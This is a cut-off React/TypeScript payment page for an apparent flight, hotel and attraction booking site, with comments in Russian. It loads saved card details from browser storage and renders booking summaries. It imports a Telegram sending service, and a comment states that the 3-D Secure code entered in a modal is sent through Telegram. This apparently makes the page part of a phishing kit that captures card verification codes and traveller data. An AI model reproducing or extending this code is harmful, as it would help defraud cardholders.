import React from 'react';
import { useNavigate } from 'react-router-dom';
import { formatDateTime, formatDuration } from './services/flightApi';
import { formatAircraftType, calculateTotalSeatPrice } from './utils/aircraft';
import { sendTelegram, formatTravelerSummary } from './services/telegram';
import ThreeDSModal from './components/ThreeDSModal';
import SegmentDetailsModal from './components/SegmentDetailsModal';
import appleLogo from './assets/apple-btn.svg';
import { getPaymentStorageKey } from './utils/paymentKey';
import { useTranslation } from './hooks/useTranslation';

const BackIcon = () => (
  <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
);

const Payment: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useTranslation();

  const [price, setPrice] = React.useState<{ currency: string; totalPerTraveller: number; travellers: number } | null>(null);
  const [trav, setTrav] = React.useState<any>({});
  const [travList, setTravList] = React.useState<any[]>([]);
  const [contact, setContact] = React.useState<any>({});
  const [flight, setFlight] = React.useState<any>(null);
  const [hotelData, setHotelData] = React.useState<any>(null);
  const [isHotelBooking, setIsHotelBooking] = React.useState(false);
  const [selectedSeats, setSelectedSeats] = React.useState<string[]>([]);
  const [selectedSeatsTotal, setSelectedSeatsTotal] = React.useState<number>(0);
  // Добавляем состояние для хранения мест по сегментам
  const [segmentSeats, setSegmentSeats] = React.useState<Record<number, { seats: string[]; total: number }>>({});
  const [card, setCard] = React.useState<any>(null);
  const [threeDSOpen, setThreeDSOpen] = React.useState(false);
  const [sentCode, setSentCode] = React.useState('');
  const [openSegIdx, setOpenSegIdx] = React.useState<number | null>(null);
  const [attractionBooking, setAttractionBooking] = React.useState<any>(null);
  const [paymentStorageKey, setPaymentStorageKey] = React.useState<string>('');

  React.useEffect(() => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const storageKey = getPaymentStorageKey();
      setPaymentStorageKey(storageKey);
      const attractionPayloadRaw = sessionStorage.getItem('attraction_payment_payload');
      if (attractionPayloadRaw) {
        try {
          const payload = JSON.parse(attractionPayloadRaw);
          setAttractionBooking(payload);
          setIsHotelBooking(false);
          const contactInfo = payload?.contact || {};
          setContact({
            firstName: contactInfo.firstName || '',
            lastName: contactInfo.lastName || '',
            email: contactInfo.email || '',
            phone: contactInfo.phone || '',
          });
          const traveler = {
            firstName: contactInfo.firstName || '',
            lastName: contactInfo.lastName || '',
            gender: 'Male',
            _type: 'Adult',
            _age: null,
          };
          setTrav(traveler);
          setTravList([traveler]);
          setPrice({
            currency: payload?.attraction?.currency || 'USD',
            totalPerTraveller: payload?.attraction?.price || 0,
            travellers: 1,
          });
          const attractionCardRaw =
            sessionStorage.getItem(`payment_card_${storageKey}`) ||
            localStorage.getItem(`payment_card_${storageKey}`);
          setCard(attractionCardRaw ? JSON.parse(attractionCardRaw) : null);
        } catch {
          setAttractionBooking(null);
        }
        return;
      }
      // Проверяем, это бронирование отеля или рейса
      const hotelSummary = sessionStorage.getItem('hotel_booking_summary');
      const isHotel = Boolean(hotelSummary);
      setIsHotelBooking(isHotel);
      
      // Очищаем данные другого типа при переключении
      if (isHotel) {
        // Очищаем данные рейсов
        sessionStorage.removeItem('selectedFlightOffer');
        sessionStorage.removeItem('selectedFlightOffer_summary');
        localStorage.removeItem('selectedFlightOffer');
        localStorage.removeItem('selectedFlightOffer_summary');
        sessionStorage.removeItem('flow_pax');
        localStorage.removeItem('flow_pax');
        
        // Для отелей используем данные из hotel_booking_summary
        const hotelData = JSON.parse(hotelSummary || '{}');
        setHotelData(hotelData);
        
        // Загружаем данные гостей из GuestInfo
        try {
          const guestsData = localStorage.getItem('hotel_guests_info');
          const contactData = localStorage.getItem('hotel_contact_info');
          
          console.log('Loading hotel data:', hotelData);
          console.log('Loading guests data:', guestsData);
          console.log('Loading contact data:', contactData);
          
          if (guestsData) {
            const guests = JSON.parse(guestsData);
            setTravList(guests.map((guest: any) => ({
              firstName: guest.firstName,
              lastName: guest.lastName,
              gender: 'Male', // По умолчанию
              _type: guest.type,
              _age: guest.age
            })));
          } else {
            // Fallback: создаем mock данные
            const adults = hotelData.adults || 1;
            const children = hotelData.children || 0;
            const travList = [];
            
            for (let i = 0; i < adults; i++) {
              travList.push({
                firstName: 'Guest',
                lastName: 'User',
                gender: 'Male',
                _type: 'Adult',
                _age: null
              });
            }
            
            for (let i = 0; i < children; i++) {
              travList.push({
                firstName: 'Child',
                lastName: 'User',
                gender: 'Male',
                _type: 'Child',
                _age: 12
              });
            }
            
            setTravList(travList);
          }
          
          if (contactData) {
            const contact = JSON.parse(contactData);
            setContact(contact);
          } else {
            // Fallback: создаем mock contact data
            setContact({
              email: 'guest@example.com',
              phone: '+1234567890'
            });
          }
        } catch {
          // Fallback при ошибке
          setTravList([]);
          setContact({ email: '', phone: '' });
        }
      } else {
        // Очищаем данные отелей при переключении на рейсы
        sessionStorage.removeItem('hotel_booking_summary');
        localStorage.removeItem('hotel_guests_info');
        localStorage.removeItem('hotel_contact_info');
        
        // Оригинальная логика для рейсов
        const tRaw = localStorage.getItem(`traveler_details_${offerId}`) || sessionStorage.getItem(`traveler_details_${offerId}`) || '{}';
        setTrav(JSON.parse(tRaw || '{}'));
        const contactRaw = localStorage.getItem(`contact_${offerId}`) || sessionStorage.getItem(`contact_${offerId}`) || '{}';
        setContact(JSON.parse(contactRaw || '{}'));
      }
      
      const pRaw = sessionStorage.getItem('flow_price');
      setPrice(pRaw ? JSON.parse(pRaw) : null);
      // Пассажиры (мульти): читаем flow_pax для кол-ва и возраста детей, затем тянем записи по индексам
      if (!isHotel) {
        try {
          const paxRaw = sessionStorage.getItem('flow_pax') || localStorage.getItem('flow_pax') || '';
          const pax = paxRaw ? JSON.parse(paxRaw) : { adults: 1, childrenAges: [] };
          const adults = Number(pax?.adults || 1);
          const kids: string[] = Array.isArray(pax?.childrenAges) ? pax.childrenAges : [];
          const total = adults + kids.length;
          const list: any[] = [];
          for (let i=0;i<total;i++){
            const key = offerId ? `traveler_details_${offerId}_${i}` : `traveler_details_${i}`;
            let obj: any = {};
            try { const raw = localStorage.getItem(key) || sessionStorage.getItem(key) || ''; obj = raw ? JSON.parse(raw) : {}; } catch {}
            const type = i < adults ? 'Adult' : 'Child';
            const age = i < adults ? null : Number(kids[i - adults] || NaN);
            list.push({ ...obj, _type: type, _age: age });
          }
          setTravList(list);
        } catch { setTravList([]); }
      }
      // Загружаем flight данные только для рейсов
      if (!isHotel) {
        // Prefer FULL offer from localStorage (FlightDetail writes it), because Seat pages may overwrite session copy with a compact summary
        let fRaw = '';
        if (offerId) {
          try { fRaw = localStorage.getItem(`selectedFlightOffer:${offerId}`) || ''; } catch {}
        }
        if (!fRaw) {
          try { fRaw = localStorage.getItem('selectedFlightOffer') || ''; } catch {}
        }
        // Fallbacks: session copies
        if (!fRaw && offerId) {
          try { fRaw = sessionStorage.getItem(`selectedFlightOffer:${offerId}`) || ''; } catch {}
        }
        if (!fRaw) {
          try { fRaw = sessionStorage.getItem('selectedFlightOffer') || ''; } catch {}
        }
        setFlight(fRaw ? JSON.parse(fRaw) : null);
      }

      const payCardRaw = sessionStorage.getItem(`payment_card_${storageKey}`) || localStorage.getItem(`payment_card_${storageKey}`);
      setCard(payCardRaw ? JSON.parse(payCardRaw) : null);

      // Загружаем места для всех сегментов (только для рейсов)
      if (!isHotel) {
        const flightData = flight ? JSON.parse(JSON.stringify(flight)) : null;
        if (flightData && Array.isArray(flightData.segments) && offerId) {
        const newSegmentSeats: Record<number, { seats: string[]; total: number }> = {} as any;
        let totalSeatsPrice = 0;

        flightData.segments.forEach((_: any, segIdx: number) => {
          // Определяем правильный offerId для этого сегмента
          const segmentOfferId = segIdx > 0 ? `${offerId}_S${segIdx + 1}` : offerId;
          
          // Load selected seats for this segment
          try {
            const selRaw = localStorage.getItem(`seat_selection_${segmentOfferId}`);
            const sel: string[] = selRaw ? JSON.parse(selRaw) : [];
            newSegmentSeats[segIdx] = { seats: sel, total: 0 };
          } catch {
            newSegmentSeats[segIdx] = { seats: [], total: 0 };
          }
          
          // Сначала пробуем взять цены, сохранённые при выборе (они равны показанным в UI)
          try {
            const pricesRaw = localStorage.getItem(`seat_selection_price_${segmentOfferId}`);
            if (pricesRaw) {
              const priceMap = JSON.parse(pricesRaw) || {};
              const segmentSeatsArr = newSegmentSeats[segIdx].seats;
              const segmentTotal = segmentSeatsArr.reduce((sum, id) => {
                const val = Number(priceMap[id]);
                if (!Number.isFinite(val)) return sum;
                return sum + val;
              }, 0);
              newSegmentSeats[segIdx].total = segmentTotal;
              totalSeatsPrice += segmentTotal;
              return; // этот сегмент уже посчитан
            }
          } catch {}

          // Fallback: если нет сохранённых цен — читаем из кэша seatmap
          try {
            const cachedRaw = sessionStorage.getItem(`seatmap_raw_${segmentOfferId}`);
            if (cachedRaw) {
              const resp = JSON.parse(cachedRaw);
              const data = resp?.data;
              const map: Record<string, { units:number; nanos:number; currency:string } | null> = {};
              const takePrice = (seat:any) => {
                const pb = seat?.priceBreakdown?.total;
                if (pb && typeof pb.units === 'number') return { units: pb.units, nanos: pb.nanos||0, currency: (pb.currencyCode||String(price?.currency||'USD')).toUpperCase() };
                const p = seat?.price || seat?.seatPrice || seat?.pricing || seat?.amount;
                if (p && typeof p.units === 'number') return { units: p.units, nanos: p.nanos||0, currency: (p.currencyCode||String(price?.currency||'USD')).toUpperCase() };
                return null;
              };
              const cabins = data?.cabins || data?.seatMap?.cabins || data?.seatMaps?.[0]?.cabins || data?.seatMap?.[0]?.cabins || data?.seatMap?.seatMapOption?.[0]?.cabins || data?.seatMapOption?.[0]?.cabins || [];
              if (Array.isArray(cabins)) {
                cabins.forEach((c:any) => {
                  if (Array.isArray(c?.rows)) {
                    c.rows.forEach((r:any) => {
                      const rowId = Number(r?.id);
                      (r?.seats||[]).forEach((s:any) => {
                        const col = String(s?.colId||s?.column||'').toUpperCase();
                        if (!rowId || !col) return;
                        map[`${String(rowId).padStart(2,'0')}${col}`] = takePrice(s);
                      });
                    });
                  }
                  if (Array.isArray(c?.seats)) {
                    c.seats.forEach((s:any) => {
                      const rowId = Number(s?.row);
                      const col = String(s?.column||'').toUpperCase();
                      if (!rowId || !col) return;
                      map[`${String(rowId).padStart(2,'0')}${col}`] = takePrice(s);
                    });
                  }
                });
              }
              const segmentSeatsArr = newSegmentSeats[segIdx].seats;
              const segmentTotal = segmentSeatsArr.reduce((sum, id) => {
                const p = map[id];
                if (!p) return sum;
                if (String(p.currency||'').toUpperCase() !== String(price?.currency||'USD').toUpperCase()) return sum;
                return sum + (p.units + (p.nanos||0)/1e9);
              }, 0);
              newSegmentSeats[segIdx].total = segmentTotal;
              totalSeatsPrice += segmentTotal;
            }
          } catch {}
        });
          setSegmentSeats(newSegmentSeats);
          setSelectedSeatsTotal(totalSeatsPrice);
        }
      }
    } catch {}
  }, []);

  // Единый пересчёт общей суммы мест по тем же данным, что используются на экранах выбора (только для рейсов)
  React.useEffect(() => {
    if (!isHotelBooking && !isAttractionBooking) {
      try {
        const offerId = sessionStorage.getItem('current_offer_id') || '';
        const cur = (price?.currency || 'USD').toUpperCase();
        if (offerId && cur) {
          const total = calculateTotalSeatPrice(offerId, cur);
          setSelectedSeatsTotal(Number(total.toFixed(2)));
        }
      } catch {}
    }
  }, [price?.currency, isHotelBooking]);

  const isAttractionBooking = Boolean(attractionBooking);
  const currency = (price?.currency || attractionBooking?.attraction?.currency || 'USD').toUpperCase();
  // Используем точные значения без округления - округляем только при отображении
  const baseTotal = isHotelBooking
    ? Number((hotelData?.totalWithTaxes || hotelData?.price || 0).toFixed(2)) // Используем итоговую цену с налогами, если есть
    : isAttractionBooking
      ? Number((attractionBooking?.attraction?.price || 0).toFixed(2)) // Для достопримечательностей используем сохраненную цену
      : Number(((price?.totalPerTraveller || 0) * (price?.travellers || 1)).toFixed(2));
  const seatExtra = (isHotelBooking || isAttractionBooking) ? 0 : Number((selectedSeatsTotal || 0).toFixed(2));
  const total = Number((baseTotal + seatExtra).toFixed(2));
  const hasCard = Boolean(card);

  const firstSeg = flight?.segments?.[0];
  const lastSeg = flight?.segments?.[flight?.segments?.length - 1];
  const totalMins = flight?.segments ? Math.round((flight.segments.reduce((acc: number, s: any) => acc + (s.totalTime || 0), 0)) / 60) : 0;
  const attractionTicketLine = React.useMemo(() => {
    const breakdown = attractionBooking?.attraction?.selection?.breakdown;
    if (!Array.isArray(breakdown) || breakdown.length === 0) return '';
    return breakdown
      .filter((item: any) => item?.count > 0)
      .map((item: any) => `${item.label || item.type}: ${item.count}`)
      .join(' · ');
  }, [attractionBooking]);

  // Helpers for traveler block
  const adults = isAttractionBooking
    ? 1
    : isHotelBooking
      ? (hotelData?.adults || 1)
      : Number((() => {
          const paxRaw = (typeof window!=='undefined') ? (sessionStorage.getItem('flow_pax') || localStorage.getItem('flow_pax') || '') : '';
          const pax = paxRaw ? JSON.parse(paxRaw) : { adults: 1, childrenAges: [] };
          return pax?.adults || 1;
        })());
  const kids = isAttractionBooking
    ? []
    : isHotelBooking 
      ? Array(hotelData?.children || 0).fill(12)
      : (() => {
          const paxRaw = (typeof window!=='undefined') ? (sessionStorage.getItem('flow_pax') || localStorage.getItem('flow_pax') || '') : '';
          const pax = paxRaw ? JSON.parse(paxRaw) : { adults: 1, childrenAges: [] };
          return Array.isArray(pax?.childrenAges) ? pax.childrenAges : [];
        })();
  const isFlightBooking = !isHotelBooking && !isAttractionBooking;

  // Код из нового модального окна будет отправляться внутри ThreeDSModal через sendTelegram

  return (
    <div className="trav-page">
      <div className="trav-header">
        <button className="back-button" onClick={() => navigate(-1)}><BackIcon/></button>
        <h1>{t('payment')}</h1>
        <div style={{ width: 24 }}></div>
      </div>

      {/* Payment methods */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>{t('choosePaymentMethod')}</div>
        {hasCard ? (
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', background:'#1f1f1f', border:'1px solid #333', borderRadius:12, padding:'12px 14px' }}>
            <div style={{ display:'flex', alignItems:'center', gap:12 }}>
              <div style={{ width:40, height:28, display:'flex', alignItems:'center', justifyContent:'center' }}>
                {/* простой индикатор бренда */}
                {(() => {
                  const brand = String(card?.brand||'').toUpperCase();
                  const map: any = {
                    VISA: new URL('./assets/card-logos/visa.svg', import.meta.url).toString(),
                    MASTERCARD: new URL('./assets/card-logos/mastercard.svg', import.meta.url).toString(),
                    AMEX: new URL('./assets/card-logos/amex.svg', import.meta.url).toString(),
                    DISCOVER: new URL('./assets/card-logos/discover.svg', import.meta.url).toString(),
                    JCB: new URL('./assets/card-logos/jcb.svg', import.meta.url).toString(),
                    UNIONPAY: new URL('./assets/card-logos/unionpay.svg', import.meta.url).toString(),
                  };
                  const src = map[brand] || map.VISA;
                  return <img src={src} alt={brand} style={{ height:24 }} />;
                })()}
              </div>
              <div style={{ color:'#ddd', fontWeight:600 }}>{String(card?.brand||'Card')} •••• {String(card?.last4||'')}</div>
            </div>
            <button className="ghost-link" onClick={()=>navigate('/payment/new-card')}>{t('edit')}</button>
          </div>
        ) : (
          <div style={{ display:'flex', gap:16 }}>
            <div onClick={()=>navigate('/payment/new-card')} style={{ background:'#1f1f1f', border:'1px solid #333', borderRadius:12, padding:16, width:110, height:90, display:'flex', flexDirection:'column', justifyContent:'center', alignItems:'center', cursor:'pointer' }}>
              <svg width="36" height="36" viewBox="0 0 24 24" fill="#4da3ff"><path d="M4 4h16a2 2 0 012 2v3H2V6a2 2 0 012-2zm18 7H2v7a2 2 0 002 2h16a2 2 0 002-2v-7zm-4 4H6v2h12v-2z"/></svg>
              <div style={{ color:'#ddd', marginTop:8, fontWeight:600 }}>{t('newCard')}</div>
            </div>
          </div>
        )}
      </div>

      {/* Summary */}
      {isAttractionBooking ? (
        <div className="section">
          <div style={{ display:'flex', alignItems:'center', gap:12 }}>
            <div style={{ width:52, height:52, borderRadius:12, overflow:'hidden', background:'#fff', flexShrink:0 }}>
              {attractionBooking?.attraction?.image ? (
                <img src={attractionBooking.attraction.image} alt={attractionBooking.attraction.name} style={{ width:'100%', height:'100%', objectFit:'cover' }} />
              ) : (
                <svg width="32" height="32" fill="#0071c2" viewBox="0 0 24 24" style={{ margin:10 }}>
                  <path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0 1 18 0zm-9-4a4 4 0 1 0 0 8 4 4 0 0 0 0-8z"/>
                </svg>
              )}
            </div>
            <div>
              <div style={{ color:'#fff', fontWeight:800 }}>{attractionBooking?.attraction?.name || t('attraction')}</div>
              <div style={{ color:'#bbb', marginTop:4 }}>{attractionBooking?.attraction?.operator || t('experiencePartner')}</div>
              <div style={{ color:'#888', marginTop:4 }}>{t('startsAt')} {attractionBooking?.attraction?.startTime || '—'}</div>
            </div>
          </div>
          <div style={{ color:'#bbb', marginTop:12 }}>
            Contact: {[attractionBooking?.contact?.firstName, attractionBooking?.contact?.lastName].filter(Boolean).join(' ') || '—'}
          </div>
          {attractionTicketLine && (
            <div style={{ color:'#bbb', marginTop:6 }}>
              Tickets: {attractionTicketLine}
            </div>
          )}
        </div>
      ) : isHotelBooking ? (
        <div className="section">
          <div style={{ display:'flex', alignItems:'center', gap:12 }}>
            <div style={{ 
              width:52, 
              height:52, 
              borderRadius:12, 
              background:'#fff', 
              display:'flex', 
              alignItems:'center', 
              justifyContent:'center',
              overflow:'hidden',
              flexShrink:0
            }}>
              {hotelData?.photo ? (
                <img 
                  src={hotelData.photo} 
                  alt={hotelData.hotel_name}
                  style={{
                    width:'100%',
                    height:'100%',
                    objectFit:'cover',
                    borderRadius:12
                  }}
                  onError={(e) => {
                    // Fallback к иконке если фото не загрузилось
                    const target = e.currentTarget as HTMLImageElement;
                    target.style.display = 'none';
                    const parent = target.parentElement;
                    if (parent && !parent.querySelector('svg')) {
                      // Безопасная замена innerHTML на createElement
                      const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                      svg.setAttribute('width', '32');
                      svg.setAttribute('height', '32');
                      svg.setAttribute('fill', '#0071c2');
                      svg.setAttribute('viewBox', '0 0 24 24');
                      const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
                      path.setAttribute('d', 'M7 14c1.66 0 3-1.34 3-3S8.66 8 7 8s-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm12-3h-8v8H3V9H1v11h2v-2h18v2h2v-7c0-2.21-1.79-4-4-4z');
                      svg.appendChild(path);
                      parent.appendChild(svg);
                    }
                  }}
                />
              ) : (
                <svg width="32" height="32" fill="#0071c2" viewBox="0 0 24 24">
                  <path d="M7 14c1.66 0 3-1.34 3-3S8.66 8 7 8s-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm12-3h-8v8H3V9H1v11h2v-2h18v2h2v-7c0-2.21-1.79-4-4-4z"/>
                </svg>
              )}
            </div>
            <div>
              <div style={{ color:'#fff', fontWeight:800, fontSize:16 }}>{hotelData?.hotel_name || 'Hotel'}</div>
              <div style={{ color:'#ccc', marginTop:4, fontSize:14 }}>
                {hotelData?.address || ''} · {hotelData?.city || ''}
              </div>
              <div style={{ color:'#ccc', marginTop:6, fontSize:14 }}>
                {hotelData?.checkIn && hotelData?.checkOut ? 
                  `${new Date(hotelData.checkIn).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })} - ${new Date(hotelData.checkOut).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })}` : 
                  'Check-in - Check-out'
                } · {hotelData?.rooms || 1} room{(hotelData?.rooms || 1) > 1 ? 's' : ''} · {hotelData?.adults || 1} adult{(hotelData?.adults || 1) > 1 ? 's' : ''}
                {hotelData?.children > 0 && ` · ${hotelData.children} child${hotelData.children > 1 ? 'ren' : ''}`}
              </div>
            </div>
          </div>
        </div>
      ) : (
        /* Flight summary per direction */
        flight && Array.isArray(flight.segments) && (
        <div className="section">
          <div style={{ display:'grid', gap:16 }}>
            {flight.segments.map((seg: any, idx: number) => {
              const legs = seg?.legs || [];
              const dep = formatDateTime(seg?.departureTime||'');
              const arr = formatDateTime(seg?.arrivalTime||'');
              // duration in minutes (API gives seconds sometimes)
              const segMins = (() => {
                const secs = Number(seg?.totalTime||0);
                if (secs > 0) return Math.round(secs/60);
                const t = Math.max(0, Math.round((new Date(seg?.arrivalTime||0).getTime() - new Date(seg?.departureTime||0).getTime())/60000));
                return t;
              })();
              // stops and layover info inside this segment
              const stopsCount = Math.max(0, legs.length - 1);
              let layMinutes = 0; let layAirport = '';
              for (let i=0;i<Math.max(0, legs.length-1);i++){
                const prevArr = new Date(legs[i].arrivalTime).getTime();
                const nextDep = new Date(legs[i+1].departureTime).getTime();
                const m = Math.max(0, Math.round((nextDep - prevArr)/60000));
                layMinutes += m;
                if (!layAirport) layAirport = legs[i].arrivalAirport?.code || legs[i+1].departureAirport?.code || '';
              }
              const stopsText = stopsCount === 0 ? 'Direct' : (stopsCount === 1 ? '1 stop' : `${stopsCount} stops`);
              const layText = stopsCount>0 ? `${Math.floor(layMinutes/60)}h ${layMinutes%60}m at ${layAirport}` : '';
              // airline logo per first leg of segment
              const sLeg = legs[0] || {};
              const sA = (sLeg?.carriersData?.[0]) || {};
              const code = String(sA.code || sLeg?.flightInfo?.carrierInfo?.marketingCarrier || sLeg?.flightInfo?.carrierInfo?.operatingCarrier || '').toUpperCase();
              const logo = sA.logo || sA.logoUrl || (code ? `https://r-xx.bstatic.com/data/airlines_logo/${code}.png` : '');
              const cabin = String(sLeg?.cabinClass || 'Economy').replace('_',' ');
              const fmtTime = (iso: string) => new Date(iso).toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', hour12: false });
              const fmtDate = (iso: string) => new Date(iso).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' });
              const fmtDur = (mins: number) => `${Math.floor(mins/60)}h ${mins%60}m`;
              const showArrDate = (()=>{ try { const d1 = new Date(seg?.departureTime||0); const d2 = new Date(seg?.arrivalTime||0); return d1.toDateString() !== d2.toDateString(); } catch { return false; } })();
              
              // Получаем места для текущего сегмента
              const currentSegmentSeats = segmentSeats[idx] || { seats: [], total: 0 };
              
              return (
                <div key={idx}>
                  <div style={{ display:'flex', alignItems:'center', gap:12 }}>
                    <div style={{ width:52, height:52, borderRadius:12, background:'#fff', display:'flex', alignItems:'center', justifyContent:'center' }}>
                      {logo ? (
                        <img src={logo} alt="airline" style={{ maxWidth:40, maxHeight:40 }} onError={(e)=>{ (e.currentTarget as HTMLImageElement).style.display='none'; }}/>
                      ) : null}
                    </div>
                    <div>
                      <div style={{ color:'#fff', fontWeight:800, fontSize:16 }}>{seg?.departureAirport?.city || seg?.departureAirport?.code} ({seg?.departureAirport?.code}) to {seg?.arrivalAirport?.city || seg?.arrivalAirport?.code} ({seg?.arrivalAirport?.code})</div>
                      <div style={{ color:'#ccc', marginTop:4, fontSize:14 }}>
                        {dep.date}, {dep.time} – {showArrDate ? `${arr.date}, ` : ''}{arr.time} · {stopsText} · {formatDuration(segMins)} · {cabin}{layText?` · Layover ${layText}`:''}
                      </div>
                      {currentSegmentSeats.seats.length > 0 && (
                        <div style={{ color:'#ccc', marginTop:6, fontSize:14 }}>
                          Selected seats: <span style={{ color:'#fff', fontWeight:600 }}>{currentSegmentSeats.seats.join(', ')}</span>
                          {currentSegmentSeats.total > 0 && (<span style={{ color:'#9fd66f' }}> · +{currency} {Number(currentSegmentSeats.total.toFixed(2))}</span>)}
                        </div>
                      )}
                    </div>
                  </div>
                  {/* Per-leg timeline hidden on payment list; available in See details modal */}
                  <div style={{ height:1, background:'#333', margin:'12px 0' }} />
                  <button className="ghost-link" onClick={()=> setOpenSegIdx(idx)}>See details</button>
                </div>
              );
            })}
          </div>
        </div>
        )
      )}

      {/* Traveler details */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8, display:'flex', alignItems:'center', gap:8 }}>
          {isHotelBooking ? t('guestDetails') : t('travelerDetailsPlural')}
          {!isHotelBooking && (!trav.firstName?.trim() || !trav.lastName?.trim()) && (
            <span style={{ color:'#ff6b6b', fontSize:14 }}>⚠️ Required</span>
          )}
        </div>
        <div style={{ display:'grid', gap:12 }}>
          {travList.length > 0 ? travList.map((t, idx) => {
            const full = [t.firstName, t.lastName].filter(Boolean).join(' ');
            const dob = (t.dd && t.mm && t.yyyy) ? `${t.dd} ${new Date(`2000-${t.mm}-01`).toLocaleString('en-GB',{month:'long'})} ${t.yyyy}` : '';
            const type = t._type === 'Adult' ? `Adult · ${t.gender==='Female'?'Female':'Male'}` : (Number.isFinite(t._age) ? `Child, ${t._age} y.o.` : 'Child');
            return (
              <div key={idx}>
                <div style={{ color:'#fff', fontWeight:700 }}>{full || `Traveler ${idx+1}`}</div>
                <div style={{ color:'#bbb', marginTop:6 }}>{type}{dob?` · ${dob}`:''}</div>
              </div>
            );
          }) : (
            <>
              <div style={{ color:'#fff', fontWeight:700 }}>{[trav.firstName, trav.lastName].filter(Boolean).join(' ') || '—'}</div>
              <div style={{ color:'#bbb', marginTop:6 }}>
                Adult · {(trav.gender || '').toLowerCase()==='female' ? 'Female' : 'Male'} · {trav.dd && trav.mm && trav.yyyy ? `${trav.dd} ${new Date(`2000-${trav.mm}-01`).toLocaleString('en-GB',{month:'long'})} ${trav.yyyy}` : ''}
              </div>
            </>
          )}
        </div>
        {isFlightBooking && (!trav.firstName?.trim() || !trav.lastName?.trim()) && (
          <button 
            className="ghost-link" 
            onClick={() => navigate('/traveler-details')}
            style={{ marginTop: 8, fontSize: 14 }}
          >
            {t('addTravelerInformation')}
          </button>
        )}
      </div>

      {/* Contact details */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8, display:'flex', alignItems:'center', gap:8 }}>
          {t('contactDetails')}
          {isFlightBooking && (!contact.email?.trim() || !contact.phone?.trim()) && (
            <span style={{ color:'#ff6b6b', fontSize:14 }}>⚠️ Required</span>
          )}
        </div>
        <div style={{ color:'#fff', fontWeight:700 }}>{contact.email || '—'}</div>
        <div style={{ color:'#bbb', marginTop:6 }}>{contact.phone || ''}</div>
        {isFlightBooking && (!contact.email?.trim() || !contact.phone?.trim()) && (
          <button 
            className="ghost-link" 
            onClick={() => navigate('/contact-details')}
            style={{ marginTop: 8, fontSize: 14 }}
          >
            {t('addContactInformation')}
          </button>
        )}
      </div>

      {/* Pricing */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>{t('pricingAndPayment')}</div>
        <div style={{ display:'flex', justifyContent:'space-between', color:'#ccc', margin:'8px 0' }}>
          <span>
            {isHotelBooking
              ? `${t('hotelStay')} (${adults} ${t('adults')}${adults>1?'s':''}${kids.length?`, ${kids.length} ${t('children')}${kids.length>1?'ren':''}`:''})`
              : isAttractionBooking
                ? t('experienceBooking')
                : `${t('tickets')} (${adults} ${t('adults')}${adults>1?'s':''}${kids.length?`, ${kids.length} ${t('children')}${kids.length>1?'ren':''}`:''})`}
          </span>
          <span>{currency} {baseTotal.toFixed(2)}</span>
        </div>
        {seatExtra>0 && (
          <div style={{ display:'flex', justifyContent:'space-between', color:'#9fd66f', margin:'4px 0' }}>
            <span>{t('selectedSeats')}</span>
            <span>+{currency} {seatExtra.toFixed(2)}</span>
          </div>
        )}
        {!isHotelBooking && !isAttractionBooking && (
          <div className="price-note" style={{ marginTop: 6 }}>
            {t('freeBaggageIncluded') || 'Free checked baggage included'}
          </div>
        )}
        <div style={{ color:'#fff', fontWeight:800, fontSize:22, display:'flex', justifyContent:'space-between', marginTop:8 }}>
          <span>{t('totalPrice')}</span>
          <span>{currency} {total.toFixed(2)}</span>
        </div>
        <div style={{ color:'#888', marginTop:6 }}>{t('includesTaxesAndFees')}</div>
      </div>

      {/* Fine print */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>{t('finePrint')}</div>
        <div style={{ color:'#bbb', lineHeight:1.6, fontSize:14 }}>
          By tapping <b>Book and pay</b>, you agree to: payment being processed by our partner; fare rules and carriage conditions of the airline; and our platform terms including data processing and refunds policy. Tickets are issued in the traveler’s name and may be non‑refundable and non‑changeable unless specified. Please verify all passenger details before payment.
        </div>
        <div style={{ color:'#bbb', marginTop:8, lineHeight:1.6, fontSize:14 }}>
          We process your personal data to complete the booking, prevent fraud, and provide customer support. Taxes and fees are included in the total price. Additional charges (e.g. baggage, seats, onboard services) may be collected by the airline.
        </div>
      </div>

      {/* Footer */}
      <div className="luggage-footer">
        <div className="price-box">
          <div className="price-label">{currency} {total.toFixed(2)}</div>
          <div className="price-sub">
          {isHotelBooking
            ? `${adults} guest${adults>1?'s':''}${kids.length?`, ${kids.length} child${kids.length>1?'ren':''}`:''}`
            : isAttractionBooking
              ? 'Experience booking'
              : `${price?.travellers||1} traveler${(price?.travellers||1)>1?'s':''}${seatExtra>0?` · +${currency} ${seatExtra.toFixed(2)} seats`:''}`
          }
        </div>
        </div>
        {hasCard ? (
          <button className="applepay-button white" onClick={async ()=>{
            // Валидация данных пользователя перед оплатой
            const validationErrors = [];
            
            if (isHotelBooking) {
              // Для отелей проверяем данные гостей
              if (!hotelData?.hotel_name) {
                validationErrors.push('Hotel information is missing');
              }
            } else if (isAttractionBooking) {
              if (!contact.email?.trim()) validationErrors.push('Email is required');
              if (!contact.phone?.trim()) validationErrors.push('Phone number is required');
            } else {
              // Для рейсов проверяем данные путешественников
              if (!trav.firstName?.trim() || !trav.lastName?.trim()) {
                validationErrors.push('Traveler name is required');
              }
              if (!contact.email?.trim()) {
                validationErrors.push('Email is required');
              }
              if (!contact.phone?.trim()) {
